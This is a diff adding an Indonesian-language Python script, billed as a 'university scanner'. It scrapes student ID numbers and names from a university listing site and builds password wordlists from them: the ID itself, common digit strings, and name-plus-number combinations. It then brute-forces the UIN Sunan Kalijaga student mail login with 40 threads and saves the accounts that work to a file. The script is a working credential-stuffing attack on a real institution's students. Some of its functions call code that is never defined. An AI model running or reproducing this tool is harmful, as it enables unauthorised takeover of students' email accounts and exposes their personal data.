@@ -1,0 +1,751 @@
+import requests as req
+
+from bs4 import BeautifulSoup as bs
+
+import urllib.parse
+
+import requests.packages.urllib3
+
+requests.packages.urllib3.disable_warnings()
+
+from concurrent.futures import ThreadPoolExecutor as PoolExecutor
+
+from concurrent.futures import ThreadPoolExecutor 
+
+import concurrent.futures
+
+import os, time, platform, hashlib, json, sys
+
+import concurrent.futures
+
+try:
+
+ import requests as req
+
+ from bs4 import BeautifulSoup as bs
+
+except:
+
+ os.system('pip install --upgrade pip')
+
+ os.system('pip install requests bs4')
+
+ os.system('clear')
+
+ exit('Install Bahan Selesai\nSilahkan Restart Script')
+
+else:
+
+ GR = '\x1b[33;30;1m'
+
+ R = '\x1b[33;31;1m'
+
+ G = '\x1b[33;32;1m'
+
+ Y = '\x1b[33;33;1m'
+
+ BL = '\x1b[33;34;1m'
+
+ P = '\x1b[33;35;1m'
+
+ B = '\x1b[33;36;1m'
+
+ W = '\x1b[33;37;1m'
+
+ W2 = '\x1b[33;37;1m'
+
+ W3 = '\x1b[33;31;1m'
+
+ C = '\x1b[33;34;1m'
+
+ C2 = '\x1b[33;36;1m'
+
+ off = '\x1b[m'
+
+ rv = platform.uname()
+
+ me = rv.release
+
+ aktif = []
+
+ error = []
+
+ result = []
+
+ xtc = []
+
+ yxc = []
+
+	
+
+
+
+def main():
+
+	os.system('clear')
+
+	gerak(f"{C}⟐•─────────────────────────────────────{C}•⟐ \n",0.0000001)
+
+	gerak(f"{C}|{C}[{W}!{C}] {W}𝚃𝚘𝚘𝚕𝚜  : 𝚂𝚌𝚊𝚗𝚗𝚎𝚛 𝚄𝚗𝚒𝚟𝚎𝚛𝚜𝚒𝚝𝚊𝚜  {off}     {C}| \n",0.0000001)
+
+	gerak(f"{C}|{C}[{W}√{C}] {W}𝚃𝚎𝚕𝚎   : LINK TELEGRAN KAMU   {off}  {C}| \n",0.0000001)
+
+	gerak(f"{C}⟐•─────────────────────────────────────{C}•⟐ \n",0.0000001)
+
+	gerak(f"{C}|[{W}01{C}]{W3}➣ {W}SCAN FORLAP                      {C}| \n",0.0000001)
+
+	gerak(f"{C}|[{W}02{C}]{W3}➣ {W}SCAN UINSUKA                     {C}| \n",0.0000001)
+
+	gerak(f"{C}⟐•─────────────────────────────────────•⟐ \n",0.0000001)
+
+	gerak(f"{C}|{W} Fast Scanner                          {C}| \n",0.00000001)
+
+	gerak(f"{C}|{W} Bisa Request Scan Univ Lain !!        {C}| \n",0.00000001)
+
+	gerak(f"{C}|{W} Harus Ada Akun Univ Nya !!            {C}| \n",0.00000001)
+
+	gerak(f"{C}⟐•─────────────────────────────────────•⟐ \n",0.0000001)
+
+	select = input(f"\n{C}[{W}?{C}]{W} Pilih : ")
+
+	if select == '1':
+
+			grab()
+
+	elif select == '2':
+
+			xuinsuka()
+
+		
+
+
+
+def simpan():
+
+	print("")
+
+	gerak(f"{C}[{W}!{C}] {W}Scan Telah Selesai ! \n",0.001)
+
+	gerak(f"{C}[{W}+{C}]{W}{C} [{G}AKTIF{C}] {W}: {G}{len(aktif)}\n",0.001)
+
+	gerak(f"{C}[{W}-{C}]{W}{C} [{R}ERROR{C}] {W}: {R}{len(error)}\n",0.001)
+
+	gerak(f"{C}[{W}+{C}]{W} Akun Aktif Telah Tersimpan\n",0.001)
+
+	gerak(f"{C}[{W}√{C}]{W} Telegram :{W} @Akbar218\n",0.001)
+
+	print("")
+
+	print(f"\r{C}[{W}1{C}]{W} Kembali Scan")
+
+	print(f"\r{C}[{W}2{C}]{W} Exit")
+
+	keluar = input(f"\n{C}[{W}?{C}]{W} Pilih : {W}")
+
+	if keluar == "1":
+
+	    main()
+
+	elif keluar == "2":
+
+	    exit()
+
+        
+
+def uinsuka(i, usr, pwd):
+
+	ses = req.Session()
+
+	url = 'https://mail.uin-suka.ac.id/'
+
+	hdr = { 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Content-Type':'application/x-www-form-urlencoded', 'Cookied':'655890d224ee827b5e8851d363e8767988476563' }
+
+	dat = { 'username':usr, 'password':pwd, 'login':'Masuk'}
+
+	janda = "http://mail.google.com/a/student.uin-suka.ac.id" 
+
+	raw = req.post(url,data=dat,headers=hdr, allow_redirects=False).text
+
+	if janda in raw:
+
+		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
+
+		aktif.append(f"{usr}:{pwd}")
+
+		with open('uinsuka_aktif.txt', 'a') as (save):
+
+			save.write(f"{usr}:{pwd}\n")
+
+	else:
+
+		print(f"{C}[{R}ERROR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
+
+		error.append(f"{usr}:{pwd}")
+
+                    
+
+def gerak(z, t):
+
+    for e in z:
+
+        sys.stdout.write(e)
+
+        sys.stdout.flush()
+
+        time.sleep(t)
+
+        
+
+def stat(u):
+
+	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
+
+	z = int(x.split('/')[7:][0])//20
+
+	return z
+
+
+
+def collect(u):
+
+	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
+
+	for i in range(len(raw)-1):
+
+		dat = raw[i+1].findAll('td')
+
+		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})
+
+
+
+def cut(x):
+
+	_ = x.split('/')[:7]
+
+	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
+
+	return _
+
+	
+
+def xunair():
+
+		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
+
+		with open(path, 'r') as (file):
+
+			lines = file.readlines()
+
+			count = 1
+
+			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
+
+			print("")
+
+			with ThreadPoolExecutor(max_workers=40) as crot:
+
+				for line in lines:
+
+					x = line.strip().split(':')
+
+					crot.submit(unair, count, x[0],x[1])
+
+					count += 1
+
+					continue
+
+				time.sleep(0.25)
+
+			simpan()
+
+			
+
+def xum():
+
+		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
+
+		with open(path, 'r') as (file):
+
+			lines = file.readlines()
+
+			count = 1
+
+			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
+
+			print("")
+
+			with ThreadPoolExecutor(max_workers=40) as crot:
+
+				for line in lines:
+
+					x = line.strip().split(':')
+
+					crot.submit(um, count, x[0],x[1])
+
+					count += 1
+
+					continue
+
+				time.sleep(0.25)
+
+			simpan()
+
+			
+
+def xuinsuka():
+
+		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
+
+		with open(path, 'r') as (file):
+
+			lines = file.readlines()
+
+			count = 1
+
+			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
+
+			print("")
+
+			with ThreadPoolExecutor(max_workers=40) as crot:
+
+				for line in lines:
+
+					x = line.strip().split(':')
+
+					crot.submit(uinsuka, count, x[0],x[1])
+
+					count += 1
+
+					continue
+
+				time.sleep(0.25)
+
+			simpan()
+
+			
+
+			
+
+
+
+def grab():
+
+	print(f"{B}[{W}1{B}]{W}nim : nim {off} : ")
+
+	print(f"{B}[{W}2{B}]{W}nim : nama + Angka {off} : ")
+
+	_0 = input(f"\n{B}[{W}?{B}]{W} 𝙿𝚒𝚕𝚒𝚑 : ")
+
+	_1 = cut(input(f"{B}[{W}?{B}]{W} 𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙻𝚒𝚗𝚔 𝙳𝚊𝚛𝚒 𝚃𝚊𝚑𝚞𝚗 𝚂𝚎𝚖𝚎𝚜𝚝?? : "))
+
+	_2 = input(f"{B}[{W}?{B}]{off}{W} File Save : ")
+
+	_3 = stat(_1)
+
+	if _0 == '1':
+
+		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
+
+		print("")
+
+		for _ in range(int(_3)):
+
+			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
+
+			collect(f'{_1}/{_*20}')
+
+		for _ in range(len(yxc)):
+
+			__ = json.loads(json.dumps(yxc[_]))['nim']
+
+			with open(_2,'a') as o_:
+
+				o_.write(__+':'+__+'\n')
+
+		done(_2)
+
+	elif _0 == '2':
+
+		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
+
+		print("")
+
+		for _ in range(int(_3)):
+
+			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
+
+			collect(f'{_1}/{_*20}')
+
+		for _ in range(len(yxc)):
+
+			__ = json.loads(json.dumps(yxc[_]))['nim']
+
+			___ = json.loads(json.dumps(yxc[_]))['nama']
+
+			try:
+
+				x = ___.split(' ')
+
+				with open(_2,'a') as o_:
+
+					 o_.write(__+':'+__+'\n')
+
+					 o_.write(__+':'+'1234\n')
+
+					 o_.write(__+':'+'12345\n')
+
+					 o_.write(__+':'+'123456\n')
+
+					 o_.write(__+':'+'1234567\n')
+
+					 o_.write(__+':'+'12345678\n')
+
+					 o_.write(__+':'+x[0].lower()+'123\n')
+
+					 o_.write(__+':'+x[0].lower()+'1234\n')
+
+					 o_.write(__+':'+x[0].lower()+'12345\n')
+
+					 o_.write(__+':'+x[0].lower()+'123456\n')
+
+					 o_.write(__+':'+x[0].lower()+'1234567\n')
+
+					 o_.write(__+':'+x[0].lower()+'12345678\n')
+
+					 o_.write(__+':'+x[0].lower()+'123456789\n')
+
+					 o_.write(__+':'+x[1].lower()+'123\n')
+
+					 o_.write(__+':'+x[1].lower()+'1234\n')
+
+					 o_.write(__+':'+x[1].lower()+'12345\n')
+
+					 o_.write(__+':'+x[1].lower()+'123456\n')
+
+					 o_.write(__+':'+x[1].lower()+'1234567\n')
+
+					 o_.write(__+':'+x[1].lower()+'12345678\n')
+
+					 o_.write(__+':'+x[1].lower()+'123456789\n')
+
+					 o_.write(__+':'+x[2].lower()+'123\n')
+
+					 o_.write(__+':'+x[2].lower()+'1234\n')
+
+					 o_.write(__+':'+x[2].lower()+'12345\n')
+
+					 o_.write(__+':'+x[2].lower()+'123456\n')
+
+					 o_.write(__+':'+x[2].lower()+'1234567\n')
+
+					 o_.write(__+':'+x[2].lower()+'12345678\n')
+
+					 o_.write(__+':'+x[2].lower()+'123456789\n')
+
+					 o_.write(__+':'+x[0].lower()+'1\n')
+
+					 o_.write(__+':'+x[0].lower()+'2\n')
+
+					 o_.write(__+':'+x[0].lower()+'3\n')
+
+					 o_.write(__+':'+x[0].lower()+'4\n')
+
+					 o_.write(__+':'+x[0].lower()+'5\n')
+
+					 o_.write(__+':'+x[0].lower()+'6\n')
+
+					 o_.write(__+':'+x[0].lower()+'7\n')
+
+					 o_.write(__+':'+x[0].lower()+'8\n')
+
+					 o_.write(__+':'+x[0].lower()+'9\n')
+
+					 o_.write(__+':'+x[0].lower()+'01\n')
+
+					 o_.write(__+':'+x[0].lower()+'02\n')
+
+					 o_.write(__+':'+x[0].lower()+'03\n')
+
+					 o_.write(__+':'+x[0].lower()+'04\n')
+
+					 o_.write(__+':'+x[0].lower()+'05\n')
+
+					 o_.write(__+':'+x[0].lower()+'06\n')
+
+					 o_.write(__+':'+x[0].lower()+'07\n')
+
+					 o_.write(__+':'+x[0].lower()+'08\n')
+
+					 o_.write(__+':'+x[0].lower()+'09\n')
+
+					 o_.write(__+':'+x[0].lower()+'10\n')
+
+					 o_.write(__+':'+x[0].lower()+'11\n')
+
+					 o_.write(__+':'+x[0].lower()+'12\n')
+
+					 o_.write(__+':'+x[0].lower()+'13\n')
+
+					 o_.write(__+':'+x[0].lower()+'14\n')
+
+					 o_.write(__+':'+x[0].lower()+'15\n')
+
+					 o_.write(__+':'+x[0].lower()+'16\n')
+
+					 o_.write(__+':'+x[0].lower()+'17\n')
+
+					 o_.write(__+':'+x[0].lower()+'18\n')
+
+					 o_.write(__+':'+x[0].lower()+'19\n')
+
+					 o_.write(__+':'+x[0].lower()+'20\n')
+
+					 o_.write(__+':'+x[0].lower()+'21\n')
+
+					 o_.write(__+':'+x[0].lower()+'22\n')
+
+					 o_.write(__+':'+x[0].lower()+'23\n')
+
+					 o_.write(__+':'+x[0].lower()+'24\n')
+
+					 o_.write(__+':'+x[0].lower()+'25\n')
+
+					 o_.write(__+':'+x[0].lower()+'26\n')
+
+					 o_.write(__+':'+x[0].lower()+'27\n')
+
+					 o_.write(__+':'+x[0].lower()+'28\n')
+
+					 o_.write(__+':'+x[0].lower()+'29\n')
+
+					 o_.write(__+':'+x[0].lower()+'30\n')
+
+					 o_.write(__+':'+x[0].lower()+'31\n')
+
+					 o_.write(__+':'+x[0].lower()+'32\n')
+
+					 o_.write(__+':'+x[1].lower()+'1\n')
+
+					 o_.write(__+':'+x[1].lower()+'2\n')
+
+					 o_.write(__+':'+x[1].lower()+'3\n')
+
+					 o_.write(__+':'+x[1].lower()+'4\n')
+
+					 o_.write(__+':'+x[1].lower()+'5\n')
+
+					 o_.write(__+':'+x[1].lower()+'6\n')
+
+					 o_.write(__+':'+x[1].lower()+'7\n')
+
+					 o_.write(__+':'+x[1].lower()+'8\n')
+
+					 o_.write(__+':'+x[1].lower()+'9\n')
+
+					 o_.write(__+':'+x[1].lower()+'01\n')
+
+					 o_.write(__+':'+x[1].lower()+'02\n')
+
+					 o_.write(__+':'+x[1].lower()+'03\n')
+
+					 o_.write(__+':'+x[1].lower()+'04\n')
+
+					 o_.write(__+':'+x[1].lower()+'05\n')
+
+					 o_.write(__+':'+x[1].lower()+'06\n')
+
+					 o_.write(__+':'+x[1].lower()+'07\n')
+
+					 o_.write(__+':'+x[1].lower()+'08\n')
+
+					 o_.write(__+':'+x[1].lower()+'09\n')
+
+					 o_.write(__+':'+x[1].lower()+'10\n')
+
+					 o_.write(__+':'+x[1].lower()+'11\n')
+
+					 o_.write(__+':'+x[1].lower()+'12\n')
+
+					 o_.write(__+':'+x[1].lower()+'13\n')
+
+					 o_.write(__+':'+x[1].lower()+'14\n')
+
+					 o_.write(__+':'+x[1].lower()+'15\n')
+
+					 o_.write(__+':'+x[1].lower()+'16\n')
+
+					 o_.write(__+':'+x[1].lower()+'17\n')
+
+					 o_.write(__+':'+x[1].lower()+'18\n')
+
+					 o_.write(__+':'+x[1].lower()+'19\n')
+
+					 o_.write(__+':'+x[1].lower()+'20\n')
+
+					 o_.write(__+':'+x[1].lower()+'21\n')
+
+					 o_.write(__+':'+x[1].lower()+'22\n')
+
+					 o_.write(__+':'+x[1].lower()+'23\n')
+
+					 o_.write(__+':'+x[1].lower()+'24\n')
+
+					 o_.write(__+':'+x[1].lower()+'25\n')
+
+					 o_.write(__+':'+x[1].lower()+'26\n')
+
+					 o_.write(__+':'+x[1].lower()+'27\n')
+
+					 o_.write(__+':'+x[1].lower()+'28\n')
+
+					 o_.write(__+':'+x[1].lower()+'29\n')
+
+					 o_.write(__+':'+x[1].lower()+'30\n')
+
+					 o_.write(__+':'+x[1].lower()+'31\n')
+
+					 o_.write(__+':'+x[1].lower()+'32\n')
+
+					 o_.write(__+':'+x[2].lower()+'1\n')
+
+					 o_.write(__+':'+x[2].lower()+'2\n')
+
+					 o_.write(__+':'+x[2].lower()+'3\n')
+
+					 o_.write(__+':'+x[2].lower()+'4\n')
+
+					 o_.write(__+':'+x[2].lower()+'5\n')
+
+					 o_.write(__+':'+x[2].lower()+'6\n')
+
+					 o_.write(__+':'+x[2].lower()+'7\n')
+
+					 o_.write(__+':'+x[2].lower()+'8\n')
+
+					 o_.write(__+':'+x[2].lower()+'9\n')
+
+					 o_.write(__+':'+x[2].lower()+'01\n')
+
+					 o_.write(__+':'+x[2].lower()+'02\n')
+
+					 o_.write(__+':'+x[2].lower()+'03\n')
+
+					 o_.write(__+':'+x[2].lower()+'04\n')
+
+					 o_.write(__+':'+x[2].lower()+'05\n')
+
+					 o_.write(__+':'+x[2].lower()+'06\n')
+
+					 o_.write(__+':'+x[2].lower()+'07\n')
+
+					 o_.write(__+':'+x[2].lower()+'08\n')
+
+					 o_.write(__+':'+x[2].lower()+'09\n')
+
+					 o_.write(__+':'+x[2].lower()+'10\n')
+
+					 o_.write(__+':'+x[2].lower()+'11\n')
+
+					 o_.write(__+':'+x[2].lower()+'12\n')
+
+					 o_.write(__+':'+x[2].lower()+'13\n')
+
+					 o_.write(__+':'+x[2].lower()+'14\n')
+
+					 o_.write(__+':'+x[2].lower()+'15\n')
+
+					 o_.write(__+':'+x[2].lower()+'16\n')
+
+					 o_.write(__+':'+x[2].lower()+'17\n')
+
+					 o_.write(__+':'+x[2].lower()+'18\n')
+
+					 o_.write(__+':'+x[2].lower()+'19\n')
+
+					 o_.write(__+':'+x[2].lower()+'20\n')
+
+					 o_.write(__+':'+x[2].lower()+'21\n')
+
+					 o_.write(__+':'+x[2].lower()+'22\n')
+
+					 o_.write(__+':'+x[2].lower()+'23\n')
+
+					 o_.write(__+':'+x[2].lower()+'24\n')
+
+					 o_.write(__+':'+x[2].lower()+'25\n')
+
+					 o_.write(__+':'+x[2].lower()+'26\n')
+
+					 o_.write(__+':'+x[2].lower()+'27\n')
+
+					 o_.write(__+':'+x[2].lower()+'28\n')
+
+					 o_.write(__+':'+x[2].lower()+'29\n')
+
+					 o_.write(__+':'+x[2].lower()+'30\n')
+
+					 o_.write(__+':'+x[2].lower()+'31\n')
+
+					 o_.write(__+':'+x[2].lower()+'32\n')
+
+			except:
+
+				continue
+
+	else:
+
+			exit()
+
+
+
+def stat(u):
+
+	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
+
+	z = int(x.split('/')[7:][0])//20
+
+	return z
+
+
+
+def collect(u):
+
+	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
+
+	for i in range(len(raw)-1):
+
+		dat = raw[i+1].findAll('td')
+
+		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})
+
+
+
+def cut(x):
+
+	_ = x.split('/')[:7]
+
+	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
+
+	return _
+
+
+
+def done(_2):
+
+	print(f"\n{B}[{W}!{B}]{W} Wordlist Selesai Dibuat! ")
+
+	print(f"{B}[{W}+{B}]{W} {len(yxc)}{W} Baris Telah Tersimpan Di Memory Internal ")
+
+	print(f"{B}[{W}!{B}]{W} Wordlist Tersimpan Sebagai {B}{_2}")
+
+
+
+
+
+if __name__ == '__main__':
+
+	
+
+	main()
+
+	
